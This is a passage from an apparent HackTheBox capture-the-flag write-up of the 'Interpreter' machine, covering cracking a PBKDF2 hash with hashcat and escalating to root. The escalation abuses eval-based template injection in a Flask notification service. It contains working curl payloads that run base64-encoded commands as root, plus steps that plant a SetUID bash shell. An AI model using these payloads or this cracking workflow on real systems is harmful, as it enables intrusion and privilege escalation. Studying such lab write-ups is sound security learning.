        }
    } catch (Exception e) {
        throw new EncryptionException(e);
    }
}
```

The hash (“digest”) is base64-encoded and returned. At the top of the class it defines the defaults:

```java
public class Digester {
    public static final int DEFAULT_SALT_SIZE = 8;
    public static final int DEFAULT_ITERATIONS = 600000;
    public static final int DEFAULT_KEY_SIZE_BITS = 256;

    private String algorithm = "PBKDF2WithHmacSHA256";
```

#### Format for Hashcat

Mode 10900 in `hashcat` on the [example hashes page](https://hashcat.net/wiki/doku.php?id=example_hashes) is PBKDF2-HMAC-SHA256:

```
sha256:1000:MTc3MTA0MTQwMjQxNzY=:PYjCU215Mi57AYPKva9j7mvF4Rc5bCnt
```

The DB stores `Base64(salt + derivedKey)`. hashcat 10900 wants `sha256:iterations:base64salt:base64hash`. So I’ll want to:

1. Base64-decode the hash, returning 40 raw bytes.
2. Take the first 8 bytes and base64-encode them to get the `base64salt` value.
3. Take the other 32 bytes and base64-encode them to get `base64hash`.

I’ll write a simple Python script to handle that:

```python
import base64
import sys

SALT_LEN = 8
ITERATIONS = 600000

def main():
    if len(sys.argv) < 2:
        sys.exit(f"usage: {sys.argv[0]} <base64-hash> [salt_len] [iterations]")
    stored = sys.argv[1].strip()
    salt_len = int(sys.argv[2]) if len(sys.argv) > 2 else SALT_LEN
    iters = int(sys.argv[3]) if len(sys.argv) > 3 else ITERATIONS

    raw = base64.b64decode(stored)
    salt = raw[:salt_len]
    dk = raw[salt_len:]

    print(f"decoded total : {len(raw)} bytes  (salt {len(salt)} + dk {len(dk)})", file=sys.stderr)
    print(f"sha256:{iters}:{base64.b64encode(salt).decode()}:{base64.b64encode(dk).decode()}")

if __name__ == "__main__":
    main()
```

And give it the hash from Interpreter:

```
oxdf@hacky$ uv run mirth_hash_to_hashcat.py 'u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w=='
decoded total : 40 bytes  (salt 8 + dk 32)
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```

#### Crack

I’ll save that hash to a file and pass it to `hashcat`:

```
oxdf@mullings:~/hackthebox/interpreter-10.129.244.184$ hashcat sedric.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v7.1.2) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

10900 | PBKDF2-HMAC-SHA256 | Generic KDF
...[snip]...
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=:snowflake1
...[snip]...
```

It cracks!

### su / SSH

This password works for sedric on the system as well using `su`:

```
mirth@interpreter:/$ su - sedric
Password: 
sedric@interpreter:~$
```

It also works over SSH:

```
oxdf@hacky$ sshpass -p snowflake1 ssh sedric@10.129.244.184
Warning: Permanently added '10.129.244.184' (ED25519) to the list of known hosts.
Linux interpreter 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64
...[snip]...
sedric@interpreter:~$
```

I’ll grab `user.txt`:

```
sedric@interpreter:~$ cat user.txt
8d65b27a************************
```

## Shell as root

### Enumeration

There are a couple ports listening that are interesting:

```
sedric@interpreter:/$ ss -tnlp
State          Recv-Q         Send-Q                   Local Address:Port                    Peer Address:Port         Process         
LISTEN         0              256                            0.0.0.0:6661                         0.0.0.0:*                            
LISTEN         0              50                             0.0.0.0:80                           0.0.0.0:*                            
LISTEN         0              128                            0.0.0.0:22                           0.0.0.0:*                            
LISTEN         0              50                             0.0.0.0:443                          0.0.0.0:*                            
LISTEN         0              80                           127.0.0.1:3306                         0.0.0.0:*                            
LISTEN         0              128                          127.0.0.1:54321                        0.0.0.0:*                            
LISTEN         0              128                               [::]:22                              [::]:*
```

54321 is new and interesting! The process list has an interesting entry as well:

```
sedric@interpreter:/$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...[snip]...
root        3551  0.0  0.7  39872 30916 ?        Ss   17:25   0:00 /usr/bin/python3 /usr/local/bin/notif.py
...[snip]...
```

There’s a Python script running continuously. `/etc/systemd/system/notif.service` sets it running as service as root:

```
[Unit]
Description=Notification server
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /usr/local/bin/notif.py
Restart=always
User=root
WorkingDirectory=/usr/local/bin

[Install]
WantedBy=multi-user.target
```

This file is configured such that only root and the sedric group can access it:

```
sedric@interpreter:~$ ls -l /usr/local/bin/notif.py 
-rwxr----- 1 root sedric 2332 Sep 19  2025 /usr/local/bin/notif.py
```

Trying to connect to the service just returns 404:

```
sedric@interpreter:~$ wget localhost:54321
--2026-05-25 17:31:53--  http://localhost:54321/
Resolving localhost (localhost)... 127.0.0.1, ::1
Connecting to localhost (localhost)|127.0.0.1|:54321... connected.
HTTP request sent, awaiting response... 404 NOT FOUND
2026-05-25 17:31:53 ERROR 404: NOT FOUND.
```

`curl` isn’t on the box, but I’ll reconnect my SSH session with `-L 54321:127.0.0.1:54321` to get a tunnel so I can test from my box:

```
oxdf@hacky$ curl localhost:54321
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

### notif.py

The file itself is a very simple Python Flask webserver:

```python
#!/usr/bin/env python3
"""
Notification server for added patients.
This server listens for XML messages containing patient information and writes formatted notifications to files in /var/secure-health/patients/.
It is designed to be run locally and only accepts requests with preformated data from MirthConnect running on the same machine.
It takes data interpreted from HL7 to XML by MirthConnect and formats it using a safe templating function.
"""
from flask import Flask, request, abort
import re
import uuid
from datetime import datetime
import xml.etree.ElementTree as ET, os

app = Flask(__name__)
USER_DIR = "/var/secure-health/patients/"; os.makedirs(USER_DIR, exist_ok=True)

def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # DOB format is DD/MM/YYYY
    try:
        year_of_birth = int(dob.split('/')[-1])
        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
            return "[INVALID_DOB]"
    except:
        return "[INVALID_DOB]"
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
    except Exception as e:
        return f"[EVAL_ERROR] {e}"

@app.route("/addPatient", methods=["POST"])
def receive():
    if request.remote_addr != "127.0.0.1":
        abort(403)
    try:
        xml_text = request.data.decode()
        xml_root = ET.fromstring(xml_text)
    except ET.ParseError:
        return "XML ERROR\n", 400
    patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")
    if patient is None:
        return "No <patient> tag found\n", 400
    id = uuid.uuid4().hex
    data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
    notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])
    path = os.path.join(USER_DIR,f"{id}.txt")
    with open(path,"w") as f:
        f.write(notification+"\n")
    return notification

if __name__=="__main__":
    app.run("127.0.0.1",54321, threaded=True)
```

The code defines a server listening on 127.0.0.1 port 54321 with one route, `/addPatient`, which only accepts POST requests. If the remote address isn’t 127.0.0.1, it returns 403. It then gets the body of the POST and decodes it as XML, returning 400 if that fails. I’ll validate this:

```
oxdf@hacky$ curl localhost:54321/addPatient
<!doctype html>
<html lang=en>
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
oxdf@hacky$ curl localhost:54321/addPatient -X POST
XML ERROR
oxdf@hacky$ curl localhost:54321/addPatient -d 'testing'
XML ERROR
```

If I give it XML, the server then finds a `<patient>` tag in the XML, or returns an error:

```
oxdf@hacky$ curl localhost:54321/addPatient -d '<fake>testing</fake>'
XML ERROR
oxdf@hacky$ curl localhost:54321/addPatient -d '<fake>testing</fake>'
XML ERROR
oxdf@hacky$ curl localhost:54321/addPatient -H 'Content-Type: application/xml' -d '<fake>testing</fake>'            
No <patient> tag found
```

By default `curl` adds `Content-Type: application/x-www-form-urlencoded`, which puts data in `request.form` (leaving `request.data` blank) in Flask. If I explicitly set it to something else (`application/xml` to be correct), it works.

The code from here processes the `<patient>` tag and passes it to `template`, the results of which are saved into a file and returned to the user:

```python
patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")
if patient is None:
    return "No <patient> tag found\n", 400
id = uuid.uuid4().hex
data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])
path = os.path.join(USER_DIR,f"{id}.txt")
with open(path,"w") as f:
    f.write(notification+"\n")
return notification
```

The `template` function is not at all safe:

```python
def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # DOB format is DD/MM/YYYY
    try:
        year_of_birth = int(dob.split('/')[-1])
        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
            return "[INVALID_DOB]"
    except:
        return "[INVALID_DOB]"
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
    except Exception as e:
        return f"[EVAL_ERROR] {e}"
```

Any time I see `eval` I know that’s bad (and probably vulnerable) code. Input validating is the regex at the top, making sure that the entire string is only certain characters.

To get to the `eval`, I’ll need to make sure the `<patient>` tag includes tags for each of `first`, `last`, `sender`, `ts`, `dob`, and `gender` are present. Otherwise they get parsed to the empty string and then fail the regex check here:

```
oxdf@hacky$ curl localhost:54321/addPatient -H 'Content-Type: whatever' -d '<patient>testing</patient>'
[INVALID_INPUT]
oxdf@hacky$ curl localhost:54321/addPatient -H 'Content-Type: whatever' -d '<patient><firstname>first</firstname><lastname>last</lastname><sender_app>app</sender_app><timestamp>1234</timestamp><birth_date>01/01/2000</birth_date></patient>'
[INVALID_INPUT]
oxdf@hacky$ curl localhost:54321/addPatient -H 'Content-Type: whatever' -d '<patient><firstname>first</firstname><lastname>last</lastname><sender_app>app</sender_app><timestamp>1234</timestamp><birth_date>01/01/2000</birth_date><gender>f</gender></patient>'
Patient first last (f), 26 years old, received from app at 1234
```

With all the fields, it passes.

### Template Injection

#### Eval POC

For some reason the application author decided to calculate the age with an `eval` call on the entire string, which is incredibly unrealistic. The `f"f'''{template}'''"` call is also very weird. It leaves the inner f-string unresolved:

```
oxdf@hacky$ python3
Python 3.12.3 (main, Mar 23 2026, 19:04:32) [GCC 13.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> s = "test"
>>> f"f'''{s}'''"
"f'''test'''"
```

That means that my input goes into `eval` wrapped in an f-string. So just putting Python code won’t work:

```
>>> s = "2 + 3"
>>> f"f'''{s}'''"
"f'''2 + 3'''"
>>> eval(f"f'''{s}'''")
'2 + 3'
```

However, if I put my input inside `{}` (which for some reason are allowed through the safety regex), it evaluates:

```
>>> s = "{2 + 3}"
>>> f"f'''{s}'''"
"f'''{2 + 3}'''"
>>> eval(f"f'''{s}'''")
'5'
```

This same behavior shows up on Interpreter:

```
oxdf@hacky$ curl localhost:54321/addPatient -H 'Content-Type: whatever' -d '<patient><firstname>first</firstname><lastname>last</lastname><sender_app>app</sender_app><timestamp>1234</timestamp><birth_date>01/01/2000</birth_date><gender>2+3</gender></patient>'
Patient first last (2+3), 26 years old, received from app at 1234
oxdf@hacky$ curl localhost:54321/addPatient -H 'Content-Type: whatever' -d '<patient><firstname>first</firstname><lastname>last</lastname><sender_app>app</sender_app><timestamp>1234</timestamp><birth_date>01/01/2000</birth_date><gender>{2+3}</gender></patient>'
Patient first last (5), 26 years old, received from app at 1234
```

#### Execution

I can’t use spaces, but there are nice Python snippets that will get execution from here. `__import__` is a Python built-in function that is called behind the `import <library>` and `from <library> import <object>` syntaxes. I can access it directly to import a library:

```
oxdf@hacky$ curl localhost:54321/addPatient -H 'Content-Type: whatever' -d '<patient><firstname>first</firstname><lastname>last</lastname><sender_app>app</sender_app><timestamp>1234</timestamp><birth_date>01/01/2000</birth_date><gender>{__import__("os")}</gender></patient>'
Patient first last (<module 'os' (frozen)>), 26 years old, received from app at 1234
```

With access to the `os` module, I’ll call `popen`:

```
oxdf@hacky$ curl localhost:54321/addPatient -H 'Content-Type: whatever' -d '<patient><firstname>first</firstname><lastname>last</lastname><sender_app>app</sender_app><timestamp>1234</timestamp><birth_date>01/01/2000</birth_date><gender>{__import__("os").popen("id")}</gender></patient>'
Patient first last (<os._wrap_close object at 0x7f6d7942e350>), 26 years old, received from app at 1234
```

`popen` returns a `os._wrap_close` object. To see the results, I’ll need to `read` from it:

```
oxdf@hacky$ curl localhost:54321/addPatient -H 'Content-Type: whatever' -d '<patient><firstname>first</firstname><lastname>last</lastname><sender_app>app</sender_app><timestamp>1234</timestamp><birth_date>01/01/2000</birth_date><gender>{__import__("os").popen("id").read()}</gender></patient>'
Patient first last (uid=0(root) gid=0(root) groups=0(root)
), 26 years old, received from app at 1234
```

That’s execution as root.

#### Shell

To run a more complex command than `id`, the straightforward approach would require characters that aren’t allowed (like space). There are a bunch of ways around this, but I’ll opt to base64-encode the command and then decode it with Python. If I want to start with the `id` command, it encodes to:

```
oxdf@hacky$ echo 'id' | base64
aWQK
```

Now I can decode that via the injection:

```
>>> s = "{__import__('base64').b64decode('aWQK')}"
>>> eval(f"f'''{s}'''")
"b'id\\n'"
>>> s = "{__import__('os').popen(__import__('base64').b64decode('aWQK').decode()).read()}"
>>> eval(f"f'''{s}'''")
'uid=1000(oxdf) gid=1000(oxdf) groups=1000(oxdf),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),117(lpadmin),984(docker),987(vboxsf)\n'
```

That’s a complete command run! I’ll try it on Interpreter:

```
oxdf@hacky$ curl localhost:54321/addPatient -H 'Content-Type: whatever' -d '<patient><firstname>first</firstname><lastname>last</lastname><sender_app>app</sender_app><timestamp>1234</timestamp><birth_date>01/01/2000</birth_date><gender>{__import__("os").popen(__import__("base64").b64decode("aWQK").decode()).read()}</gender></patient>'
Patient first last (uid=0(root) gid=0(root) groups=0(root)
), 26 years old, received from app at 1234
```

That’s execution as root again!

Now to run other commands, I just need to base64-encode them. I’ll create a SetUID `bash`:

```
sedric@interpreter:~$ echo 'cp /bin/bash /tmp/0xdf; chown root:root /tmp/0xdf; chmod 6777 /tmp/0xdf' | base64 -w0
Y3AgL2Jpbi9iYXNoIC90bXAvMHhkZjsgY2hvd24gcm9vdDpyb290IC90bXAvMHhkZjsgY2htb2QgNjc3NyAvdG1wLzB4ZGYK
```

It runs:

```
oxdf@hacky$ curl localhost:54321/addPatient -H 'Content-Type: whatever' -d '<patient><firstname>first</firstname><lastname>last</lastname><sender_app>app</sender_app><timestamp>1234</timestamp><birth_date>01/01/2000</birth_date><gender>{__import__("os").popen(__import__("base64").b64decode("Y3AgL2Jpbi9iYXNoIC90bXAvMHhkZjsgY2hvd24gcm9vdDpyb290IC90bXAvMHhkZjsgY2htb2QgNjc3NyAvdG1wLzB4ZGYK").decode()).read()}</gender></patient>'
Patient first last (), 26 years old, received from app at 1234
```

And there’s a root-owned SetUID file at `/tmp/0xdf`:

```
sedric@interpreter:~$ ls -l /tmp/0xdf 
-rwsrwsrwx 1 root root 1265648 May 26 06:18 /tmp/0xdf
```

I’ll run with `-p` to not drop privs:

```
sedric@interpreter:~$ /tmp/0xdf -p
0xdf-5.2#
```

And grab `root.txt`:

```
0xdf-5.2# cat root.txt
52c2a42c************************
```
